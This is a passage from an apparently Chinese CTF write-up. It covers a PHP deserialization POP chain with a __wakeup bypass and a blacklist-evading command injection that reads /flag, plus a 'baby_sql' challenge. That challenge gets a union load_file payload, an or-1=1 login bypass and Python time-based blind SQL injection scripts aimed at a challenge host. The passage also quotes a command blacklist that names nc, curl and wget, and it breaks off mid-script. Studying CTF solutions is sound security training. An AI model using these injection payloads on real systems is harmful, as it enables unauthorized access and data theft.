language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;msg = <span class="keyword">new</span> <span class="title function_ invoke__">class01</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;cls = <span class="keyword">new</span> <span class="title function_ invoke__">class00</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3 = <span class="keyword">new</span> <span class="title function_ invoke__">class02</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class="string">&quot;payload&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​之后，通过信息搜集，发现了 PHP 版本是 5.4，存在成员个数不同绕过 <code>__wakeup</code>  的方法，可以直接干，将上面的 payload 修改一下，然后 base64 编码即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span></span><br></pre></td></tr></table></figure><p>​好了，之后就是读取 flag 了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​没有过滤空格，还算好（主要是因为这里不知道为啥我用一些手法绕不过空格，我就没有管了，毕竟 $ 没了，多个重定向符也有问题，过不了 /dev/null），寻常的 ls，dir 都被过滤了，大小于符号和中括号没有过，通配符过滤了，反斜杠也过滤了，那就用中括号和文件名来绕过吧，先来一波：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:/bin/l[s] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:12:&quot;/bin/l[s] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoxMjoiL2Jpbi9sW3NdIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19</span></span><br></pre></td></tr></table></figure><p>​成功打出组合拳，这里存在一个无回显的一个绕过，需要用 || 来绕过 <code>&gt;/dev/null 2&gt;&amp;1</code> ，原理就是让这一串单独执行或者不执行即可。</p><p>​之后就是读取 flag 了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///bin/ca[t] /fla[g] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span></span><br></pre></td></tr></table></figure><p>​之后读取源码找到了 flag</p><h3 id="baby_sql"><a class="markdownIt-Anchor" href="#baby_sql">#</a> baby_sql：</h3><h4 id="非预期"><a class="markdownIt-Anchor" href="#非预期">#</a> 非预期：</h4><p>​index 页面的 password 存在 sql 注入，本来想出弱密码的，结果没注意到这里也能打注入，被 sqlmap 一把梭了。</p><p>​首先万能密码登陆之后，用 group by 确定字段数，接着这里 可以用 loadfile 来快速出 flag。当然，这是建立在 flag 的文件 确实在根目录并且名字确实是 flag，而且存在其他限制，成 功逃课的可能性并不是很大，这里因为同时存在两个原因导致了非预期，一是因为题目部署到平台的时候有个参数忘记删了，这个参数导致了 flag 会被写入 /flag，另外，题目测试的时候，var_dump 我忘记删了，会把信息给一同打印出来，就导致了这个题有回显，我的锅啊。</p><p><code>payload：-1'/**/union/**/select/**/1,1,load_file('/flag')#</code></p><h4 id="预期解"><a class="markdownIt-Anchor" href="#预期解">#</a> 预期解</h4><p>​首先，index 是一个登陆框，排除弱密码的可能，别问为什么，因为爆不出来，直接考虑万能密码，根据密码是存在字符和字母数字的，所以预测为字符型，直接 <code>1' or 1=1#</code> 即可</p><p>​第二页有个莫名其妙的报错，不管。</p><p>​拿到这个题的第一时间 fuzz 一下过滤，先做几个尝试，首先，我没捣鼓过这个题能否做布尔盲注，所以直接上时间盲注的手法。随便写入一些，触发过滤，发现有异常输出，也就是 NO,Hacker，好了，可以跑字典了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&quot;select&quot;</span>,</span><br><span class="line"><span class="string">&quot;update&quot;</span>,</span><br><span class="line"><span class="string">&quot;from&quot;</span>,</span><br><span class="line"><span class="string">&quot;where&quot;</span>,</span><br><span class="line"><span class="string">&quot;union&quot;</span>,</span><br><span class="line"><span class="string">&quot;like&quot;</span>,</span><br><span class="line"><span class="string">&quot;and&quot;</span>,</span><br><span class="line"><span class="string">&quot;delete&quot;</span>,</span><br><span class="line"><span class="string">&quot;drop&quot;</span>,</span><br><span class="line"><span class="string">&quot;insert&quot;</span>,</span><br><span class="line"><span class="string">&quot;join&quot;</span>,</span><br><span class="line"><span class="string">&quot;hex&quot;</span>,</span><br><span class="line"><span class="string">&quot;or&quot;</span>,</span><br><span class="line"><span class="string">&quot;if&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor&quot;</span>,</span><br><span class="line"><span class="string">&quot;not&quot;</span>,</span><br><span class="line"><span class="string">&quot;table_name&quot;</span>,</span><br><span class="line"><span class="string">&quot;CHAR&quot;</span>,</span><br><span class="line"><span class="string">&quot;group_concat&quot;</span>,</span><br><span class="line"><span class="string">&quot;information&quot;</span>,</span><br><span class="line"><span class="string">&quot;schema&quot;</span>,</span><br><span class="line"><span class="string">&quot;columns&quot;</span>,</span><br><span class="line"><span class="string">&quot;regexp&quot;</span>,</span><br><span class="line"><span class="string">&quot;greatest&quot;</span>,</span><br><span class="line"><span class="string">&quot;ascii&quot;</span>,</span><br><span class="line"><span class="string">&quot;substr&quot;</span>,</span><br><span class="line"><span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line"><span class="string">&quot;in&quot;</span>,</span><br><span class="line"><span class="string">&quot;between&quot;</span>,</span><br><span class="line"><span class="string">&quot;database&quot;</span>,</span><br><span class="line"><span class="string">&quot;offset&quot;</span>,</span><br><span class="line"><span class="string">&quot;limit&quot;</span>,</span><br><span class="line"><span class="string">&quot;sleep&quot;</span>,</span><br><span class="line"><span class="string">&quot;benchmark&quot;</span>,</span><br><span class="line"><span class="string">&quot;bin&quot;</span>,</span><br><span class="line"><span class="string">&quot;mid&quot;</span>,</span><br><span class="line"><span class="string">&quot;substring&quot;</span>,</span><br><span class="line"><span class="string">&quot;updatexml&quot;</span>,</span><br><span class="line"><span class="string">&quot; &quot;</span>,</span><br><span class="line"><span class="string">&quot;--&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&#x27;&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;()&quot;</span>,</span><br><span class="line"><span class="string">&quot;-&quot;</span>,</span><br><span class="line"><span class="string">&quot;+&quot;</span>,</span><br><span class="line"><span class="string">&quot;#&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span>,</span><br><span class="line"><span class="string">&quot;/&quot;</span>,</span><br><span class="line"><span class="string">&quot;!&quot;</span>,</span><br><span class="line"><span class="string">&quot;,&quot;</span>,</span><br><span class="line"><span class="string">&quot;`&quot;</span>,</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>,</span><br><span class="line"><span class="string">&quot;|&quot;</span>,</span><br><span class="line"><span class="string">&quot;;&quot;</span>,</span><br><span class="line"><span class="string">&quot;^&quot;</span>,</span><br><span class="line"><span class="string">&quot;%&quot;</span>,</span><br><span class="line"><span class="string">&quot;@&quot;</span>,</span><br><span class="line"><span class="string">&quot;=&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;NO,Hacker&quot;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/worker.php&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:i&#125;</span><br><span class="line">    rsp = post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> temp <span class="keyword">in</span> rsp.text:</span><br><span class="line">        a.append(i)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;insert&#x27;, &#x27;join&#x27;, &#x27;hex&#x27;, &#x27;CHAR&#x27;, &#x27;information&#x27;, &#x27;updatexml&#x27;, &#x27; &#x27;, &#x27;--&#x27;, &#x27;=&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span></span><br></pre></td></tr></table></figure><p>​最后跑出来和我预计的差不多，然后因为又是可以输入字符等等，推测还是字符型注入，随机构造一下 payload 看看能否成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33161/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;111&#x27;/**/or/**/if((select/**/database())/**/like/**/database(),sleep(5),sleep(0))#&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(istime(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#timeout</span></span><br></pre></td></tr></table></figure><p>​可以盲注，因为过滤了 infomation，所以需要用 innodb 来绕过，先跑，直接梭哈（脚本每次的时间会很长，这个是为了保证正确率，因为远程测试的时候出现了服务器扛不住的情况，所以，需要增加等待时长来防止服务器宕机）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试的时候服务器有点问题，爆破的时候总是要出问题，建议每一个函数多跑几次保证成功率，或者每次多修改一些time和sleep的时长保证正确率</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33113/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库长度为：7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库长度为：%d&quot;</span>%i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库名为greatsql</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库的名字是&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库的个数为4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的个数为&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [10, 5, 5, 7]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len_list</span>():</span><br><span class="line">    name_len_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name_len_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name_len_list)</span><br><span class="line">    <span class="keyword">return</span> name_len_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上一个查询结果为四次，所以手动查四次，没跑完一次，修改limit后面的参数，以及第一层for循环的参数</span></span><br><span class="line"><span class="comment"># flag1shere</span></span><br><span class="line"><span class="comment"># mysql</span></span><br><span class="line"><span class="comment"># users</span></span><br><span class="line"><span class="comment"># workers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_list</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> 